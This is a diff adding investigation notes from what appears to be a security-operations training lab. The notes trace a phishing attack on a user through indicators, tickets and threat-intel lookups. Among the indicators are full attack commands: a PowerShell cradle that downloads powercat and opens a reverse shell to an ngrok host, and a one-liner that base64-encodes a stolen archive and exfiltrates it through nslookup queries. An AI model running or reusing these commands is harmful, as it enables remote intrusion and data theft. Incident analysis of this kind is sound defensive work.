@@ -1,0 +1,173 @@
+Michael Ascot received a phishing email from an outside sender with an invoice ZIP file. Inside was a shortcut pretending to be a PDF, and opening it ran PowerShell, a Windows command tool, which downloaded Powercat and gave the attacker a reverse shell, meaning remote control of the computer. The attacker then used PowerView, a network scanning tool, to study the company network, connected to a shared folder of financial records, and copied files onto Michael's computer. Finally, the stolen files were packed into a ZIP file and sent out in small pieces through DNS lookups, which are normal internet address requests, to attacker controlled domains.
+
+
+Ticket 1003 (RTeam): this one was a legit IT maintenance email from Yani Zubair. It was NOT malicious because the forceupdate.ps1 script only installed Windows updates, collected routine diagnostics, and sent the report back to the IT team - ticket
+Ticket 1000 (Medium screenshot) - ticket
+Ticket 1001 (Medium screenshot) - ticket
+Ticket 1002 (Medium screenshot) - ticket
+Ticket 1003 (RTeam and Medium screenshot; false positive) - ticket
+Ticket 1007 (Medium; phishing attachment, true positive) - ticket
+Ticket 1015 (RTeam; phishing email, true positive) - ticket
+Ticket 1017 (RTeam screenshot) - ticket
+Ticket 1018 (RTeam screenshot) - ticket
+Ticket 1019 (RTeam screenshot) - ticket
+Ticket 1020 (RTeam screenshot) - ticket
+Ticket 1021 (RTeam screenshot) - ticket
+Ticket 1022 (RTeam screenshot) - ticket
+Ticket 1027 (Medium; suspicious nslookup.exe child process, true positive) - ticket
+Ticket 1033 (RTeam; network share data collection) - ticket
+Ticket 1039 (RTeam) - ticket
+Ticket 1040 (RTeam) - ticket
+Ticket 1041 (RTeam) - ticket
+Ticket 1042 (RTeam screenshot) - ticket
+Ticket 1043 (RTeam screenshot) - ticket
+Ticket 1044 (RTeam screenshot) - ticket
+Ticket 1045 (RTeam screenshot) - ticket
+Ticket 1046 (RTeam screenshot) - ticket
+Ticket 1047 (RTeam screenshot) - ticket
+Ticket 1048 (RTeam) - ticket
+Ticket 1049 (RTeam) - ticket
+Ticket 1050 (RTeam screenshot) - ticket
+Ticket 1051 (RTeam screenshot) - ticket
+michael.ascot@tryhatme.com - email
+sophie.j@tryhatme.com - email
+michelle.smith@tryhatme.com - email
+roger.fedora@tryhatme.com - email
+yani.zubair@tryhatme.com - email
+miguel.odonnell@tryhatme.com - email
+cain.omoore@tryhatme.com - email
+kyra.flores@tryhatme.com - email
+amna.espinoza@tryhatme.com - email
+ashwin.johnston@tryhatme.com - email
+safa.prince@tryhatme.com - email
+diego.summers@tryhatme.com - email
+armaan.terry@tryhatme.com - email
+john@hatmakereurope.xyz - email
+YourEmailAddress@yourcompany.com - email
+the Medium sender john@hatmakereurope.xyz is the same address as the RTeam sender, not a different one - email
+tryhatme.com - domain
+win-3450 - host
+win-3461 - host
+win-3459 - host
+win-3460 - host
+win-3449 - host
+win-3451 - host
+win-3452 - host
+win-3453 - host
+win-3454 - host
+win-3455 - host
+win-3456 - host
+win-3457 - host
+win-3458 - host
+Force Update Fix - email subject
+Important: Pending Invioce! - email subject
+Windows Update and Diagnostics Report - email subject
+forceupdate.ps1 - file
+C:\Temp - path
+C:\Temp\SystemInfo.txt - path
+C:\Temp\NetworkConfig.txt - path
+C:\Temp\InstalledPrograms.txt - path
+C:\Temp\RunningProcesses.txt - path
+HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* - path
+T1566.001 - MITRE ID
+ImportantInvoice-February.zip (RTeam spelling) - file
+ImportantInvoice-Febrary.zip (Medium spelling) - file
+invioce.pdf.lnk (RTeam body spelling) - file
+invoice.pdf.lnk (RTeam IOC list and Medium spelling) - file
+C:\Users\michael.ascot\AppData\Local\Temp\5\Temp1_ImportantInvoice-Febrary.zip\ImportantInvoice-Febrary\invoice.pdf.lnk - path
+Explorer.EXE - process
+hatmakereurope.xyz TryDetectThis status CLEAN - analysis result
+invoice.pdf.lnk TryDetectThis status Malicious - analysis result
+Sysmon Event ID 15 file stream creation - event ID
+Sysmon Event ID 1 process creation - event ID
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe - path
+powershell.exe - process
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell" - command
+IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1') - command
+raw.githubusercontent.com - domain
+https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1 - URL
+powercat.ps1 - file
+powercat - command
+2.tcp.ngrok.io - domain
+2.tcp.ngrok.io:19282 - C2 address
+19282 - port
+SSF\michael.ascot - account
+michael.ascot - account
+Invoke-Expression - command
+T1087.002 - MITRE ID
+__PSScriptPolicyTest_hnpvwg1v.3mr.ps1 - file
+PowerView.ps1 - file
+C:\Users\michael.ascot\downloads\PowerView.ps1 - path
+Get-NetDomain - command
+Get-NetGroup - command
+T1039 - MITRE ID
+C:\Users\michael.ascot\Downloads\exfiltration - path
+C:\Users\michael.ascot\downloads\ - path
+net.exe - process
+Robocopy.exe - process
+C:\Windows\system32\net.exe - path
+"C:\Windows\system32\net.exe" use Z: \\FILESRV-01\SSF-FinancialRecords - command
+FILESRV-01 - host
+\\FILESRV-01\SSF-FinancialRecords - network share
+Z: - path
+InvestorPresentation2023.pptx - file
+ClientPortfolioSummary.xlsx - file
+C:\Users\michael.ascot\Downloads\exfiltration\InvestorPresentation2023.pptx - path
+C:\Users\michael.ascot\Downloads\exfiltration\ClientPortfolioSummary.xlsx - path
+T1048.003 - MITRE ID
+net.exe use Z: /delete - command
+exfilt8me.zip - file
+C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip - path
+nslookup.exe - process
+C:\Windows\system32\nslookup.exe - path
+powershell.exe spawning nslookup.exe - process relationship
+haz4rdw4re.io - domain
+UEsDBBQAAAAIANigLlfVU3cDIgAAAI.haz4rdw4re.io - domain
+$base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object { Invoke-Expression "nslookup $_.haz4rdw4re.io" } - command
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass - command
+UEsDBBQAAAAIANigLlfVU3cDIgAAAI - encoded string
+8AAAAbAAAAQ2xpZW50UG9ydGZvbGlv - encoded string
+U3VtbWFyeS54bHN4c87JTM0rCcgvKk - encoded string
+nLz8nMDy7NzU0sqtSryCmu4OVyprsk - encoded string
+AFBLAwQUAAAACAC9OC5XHh1O5R8AAA - encoded string
+AdAAAAHQAAAEludmVzdG9yUHJlc2Vu - encoded string
+dGF0aW9uMjAyMy5wcHR488wrSy0uyS - encoded string
+8KKEotTs0rSSzJzM8zMjAy1isoKKkA - encoded string
+AFBLAQIUABQAAAAIANigLlfVU3cDIg - encoded string
+AAAI8AAAAbAAAAAAAAAAAAAAAAAAAA - encoded string
+AABDbGllbnRQb3J0Zm9saW9TdW1tYX - encoded string
+J5Lnhsc3hQSwECFAAUAAAACAC9OC5X - encoded string
+Hh1O5R8AAAAdAAAAHQAAAAAAAAAAAA - encoded string
+AAAABbAAAASW52ZXN0b3JQcmVzZW50 - encoded string
+YXRpb24yMDIzLnBwdHhQSwUGAAAAAA - encoded string
+IAAgCUAAAAtQAAAAAA - encoded string
+145BB70ABD0CC625F4A7ADD8CFB08982C39C4573470C8B87DB41D755BD2F9EA0 - encoded string
+50E5BF8361DF2442546F21E08B1561273F4CCC610258F622AC1A4B8EBF0A0386 - encoded string
+d41d8cd98f00b204e9800998ecf8427e - encoded string
+da39a3ee5e6b4b0d3255bfef95601890afd80709 - encoded string
+e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 - encoded string
+index=* host=win-3450 - search query
+base64 - encoding method
+alternate data stream (ADS) - artifact
+8:06:13 AM (Ticket 1003 email) - timestamp
+8:22:49 AM (Ticket 1015 phishing email) - timestamp
+8:31:15 AM (PowerShell policy test and reverse shell activity) - timestamp
+8:32:23 AM (PowerView.ps1 execution) - timestamp
+8:34:11 AM (network share mounted) - timestamp
+8:35:16 AM (network share disconnected) - timestamp
+8:35:34 AM (archive encoded and DNS exfiltration started) - timestamp
+06/17/2025 18:54:23.629 (Medium phishing email alert) - timestamp
+06/17/2025 19:14:41.629 (Medium LNK file stream event) - timestamp
+06/17/2025 19:19:33.629 (Medium nslookup.exe alert) - timestamp
+JSON feed cross check: my indicator list had no IPv4 addresses in it, so there were no IPs of mine to look for in the feed - feed check
+145BB70ABD0CC625F4A7ADD8CFB08982C39C4573470C8B87DB41D755BD2F9EA0 - not in feed
+50E5BF8361DF2442546F21E08B1561273F4CCC610258F622AC1A4B8EBF0A0386 - not in feed
+d41d8cd98f00b204e9800998ecf8427e - not in feed
+da39a3ee5e6b4b0d3255bfef95601890afd80709 - not in feed
+e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 - not in feed
+JSON feed summary: the feed only has two indicator types, ip and sha256. Domains are not in the feed at all - feed summary
+
+Talos check: haz4rdw4re.io returned nothing at all. The page said Unfortunately we can't find any results for your search, so Talos simply has no data on this domain - talos check
+Talos check: hatmakereurope.xyz was found, but its Web Reputation is listed as Unknown. It is not on the Talos block list and no related IP address data could be found - talos check
+On the CyberChef screenshot, the decoded output starts with PK and then a bunch of unreadable characters. I think this means the encoded string is the start of a ZIP file, probably the stolen file being sent out through DNS.
+URLScan check: searching haz4rdw4re.io showed 0 public scan records. This does not prove the domain is safe, it only means URLScan has never saved a scan of it - urlscan check
